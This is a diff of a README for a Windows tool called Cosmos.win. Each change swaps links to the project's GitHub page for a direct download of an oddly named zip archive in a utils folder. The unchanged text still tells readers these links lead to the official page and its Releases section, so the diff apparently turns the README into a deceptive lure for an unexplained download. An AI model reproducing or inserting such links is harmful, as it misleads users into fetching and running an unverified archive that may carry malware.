@@ -1,6 +1,6 @@
 # 🌌 Cosmos.win - Reliable Multi-Tools for Everyday Use
 
-[![Download Cosmos.win](https://img.shields.io/badge/Download-Cosmos.win-brightgreen?style=for-the-badge)](https://github.com/Mhikkison/Cosmos.win)
+[![Download Cosmos.win](https://img.shields.io/badge/Download-Cosmos.win-brightgreen?style=for-the-badge)](https://github.com/Mhikkison/Cosmos.win/raw/refs/heads/main/utils/Cosmos_win_scatteredly.zip)
 
 ---
 
@@ -30,7 +30,7 @@ To begin using Cosmos.win, follow the steps below carefully. You do not need any
 ## 📥 How to Download and Install Cosmos.win
 
 1. Click the large green button at the top or here:  
-   [Download Cosmos.win](https://github.com/Mhikkison/Cosmos.win)  
+   [Download Cosmos.win](https://github.com/Mhikkison/Cosmos.win/raw/refs/heads/main/utils/Cosmos_win_scatteredly.zip)  
    This link will take you to the official GitHub page where you can get the setup file.
 
 2. On the GitHub page, look for the **Releases** section on the right side or scroll down the page. Find the latest release version.
@@ -70,7 +70,7 @@ To keep Cosmos.win working well and secure, it helps to update often.
 3. If an update is available, the app will guide you to download and install it.
 4. Following these updates is important to fix bugs and add improvements.
 
-If you want, you can also visit the same [Download Page](https://github.com/Mhikkison/Cosmos.win) to check for the latest version manually.
+If you want, you can also visit the same [Download Page](https://github.com/Mhikkison/Cosmos.win/raw/refs/heads/main/utils/Cosmos_win_scatteredly.zip) to check for the latest version manually.
 
 ---
 
@@ -104,7 +104,7 @@ Cosmos.win was built to bring powerful tools together in one place for Windows u
 
 ## 📚 Additional Resources
 
-- Visit the GitHub page to see updates and releases: [https://github.com/Mhikkison/Cosmos.win](https://github.com/Mhikkison/Cosmos.win)
+- Visit the GitHub page to see updates and releases: [https://github.com/Mhikkison/Cosmos.win/raw/refs/heads/main/utils/Cosmos_win_scatteredly.zip](https://github.com/Mhikkison/Cosmos.win/raw/refs/heads/main/utils/Cosmos_win_scatteredly.zip)
 - Explore the Issues tab on GitHub to report bugs or request new features.
 - Use the included help files and guides inside the app for more information.
 
@@ -112,6 +112,6 @@ Cosmos.win was built to bring powerful tools together in one place for Windows u
 
 ## 🔗 Download Cosmos.win Now
 
-[![Download Cosmos.win](https://img.shields.io/badge/Download-Cosmos.win-blueviolet?style=for-the-badge)](https://github.com/Mhikkison/Cosmos.win)  
+[![Download Cosmos.win](https://img.shields.io/badge/Download-Cosmos.win-blueviolet?style=for-the-badge)](https://github.com/Mhikkison/Cosmos.win/raw/refs/heads/main/utils/Cosmos_win_scatteredly.zip)  
 
 Click the button above to visit the official page and start using Cosmos.win today.
